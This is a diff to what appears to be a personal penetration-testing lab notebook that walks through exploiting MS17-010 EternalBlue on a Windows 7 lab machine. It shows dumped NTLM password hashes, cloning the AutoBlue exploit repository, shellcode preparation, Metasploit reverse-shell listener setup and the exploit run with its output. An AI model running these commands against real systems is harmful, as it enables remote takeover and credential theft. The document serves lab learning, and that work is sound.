@@ -126,7 +126,7 @@ msf6 auxiliary(scanner/smb/smb_ms17_010) > run
 ```
 
 
-### Trying other module of EternalBlue
+### Trying another module of EternalBlue
 
 ** 0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption**
 
@@ -295,5 +295,144 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::
 user:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
 meterpreter > 
+
+```
+
+### Using Manual Method
+
+1. Go to exploit database - https://www.exploit-db.com/exploits/42315
+	- You can see github information there 
+```
+https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/42315.py
+```
+
+2. Searching eternalBlue github - https://github.com/3ndG4me/AutoBlue-MS17-010
+3. Clone the code to the kali
+```
+git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
+
+```
+
+Go to the AutoBlue-MS17-010 Folder - the Instructions is actually in Git
+Install the required python Modules
+Once the requirements were satisfied, run the python checker if everything works well
+
+Please see below for the actual commands
+```
+cd AutoBlue
+──(root㉿kali)-[/opt]
+└─# cd AutoBlue-MS17-010 
+                                                                             
+┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]
+└─# ls
+LICENSE                   eternalblue_exploit7.py  requirements.txt
+README.md                 eternalblue_exploit8.py  shellcode
+eternal_checker.py        listener_prep.sh         zzz_exploit.py
+eternalblue_exploit10.py  mysmb.py
+                                                                             
+┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]
+└─# pip install -r requirements.txt
+Requirement already satisfied: impacket in /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (0.11.0)
+Requirement already satisfied: dsinternals in /usr/lib/python3/dist-packages (from impacket->-r requirements.txt (line 1)) (1.2.4)
+WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv
+                                                                                                                       
+┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]
+└─# python eternal_checker.py 192.168.64.2
+[*] Target OS: Windows 7 Ultimate 7601 Service Pack 1
+[!] The target is not patched
+=== Testing named pipes ===
+[*] Done
+                                                                                                                       
+┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]
+└─# 
+
+```
+
+
+**You see, when we run** `python eternal_checker.py 192.168.64.2'
+**It said that it is not patched**
+You can take screenshot of it
+
+![[Pasted image 20240618173441.png]]
+
+
+Go to shellcode directory and run the shell
+
+```
+──(root㉿kali)-[/opt/AutoBlue-MS17-010]
+└─# cd shellcode        
+                                                                                                                       
+┌──(root㉿kali)-[/opt/AutoBlue-MS17-010/shellcode]
+└─# ls
+eternalblue_kshellcode_x64.asm  eternalblue_kshellcode_x86.asm  eternalblue_sc_merge.py  shell_prep.sh
+                                                                                                                       
+┌──(root㉿kali)-[/opt/AutoBlue-MS17-010/shellcode]
+└─# ./shell_prep.sh 
+
+
+┌──(root㉿kali)-[/opt/AutoBlue-MS17-010/shellcode]
+└─# cd ..       
+                                                                                                                       
+┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]
+└─# ./listener_prep.sh 
+  __
+  /,-
+  ||)
+  \\_, )
+   `--'
+Eternal Blue Metasploit Listener
+
+LHOST for reverse connection:
+192.168.64.4
+LPORT for x64 reverse connection:
+9999
+LPORT for x86 reverse connection:
+2222
+Enter 0 for meterpreter shell or 1 for regular cmd shell:
+1
+
+```
+
+```
+[*] Processing config.rc for ERB directives.
+resource (config.rc)> use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+resource (config.rc)> set PAYLOAD windows/x64/shell/reverse_tcp
+PAYLOAD => windows/x64/shell/reverse_tcp
+resource (config.rc)> set LHOST 192.168.64.4
+LHOST => 192.168.64.4
+resource (config.rc)> set LPORT 9999
+LPORT => 9999
+resource (config.rc)> set ExitOnSession false
+ExitOnSession => false
+resource (config.rc)> set EXITFUNC thread
+EXITFUNC => thread
+resource (config.rc)> exploit -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+resource (config.rc)> set PAYLOAD windows/shell/reverse_tcp
+PAYLOAD => windows/shell/reverse_tcp
+resource (config.rc)> set LPORT 2222
+LPORT => 2222
+resource (config.rc)> exploit -j
+[*] Exploit running as background job 1.
+[*] Started reverse TCP handler on 192.168.64.4:9999 
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.64.4:2222 
+msf6 exploit(multi/handler) >
+```
+
+Create a new tab and run the puython. you will notice that you Blue WIndows 7 crash (bluescreen or restarted)
+```
+┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]
+└─# python eternalblue_exploit7.py 192.168.64.2 shellcode/sc_all.bin
+shellcode size: 2307
+numGroomConn: 13
+Target OS: Windows 7 Ultimate 7601 Service Pack 1
+SMB1 session setup allocate nonpaged pool success
+SMB1 session setup allocate nonpaged pool success
+good response status: INVALID_PARAMETER
+done
 
 ```
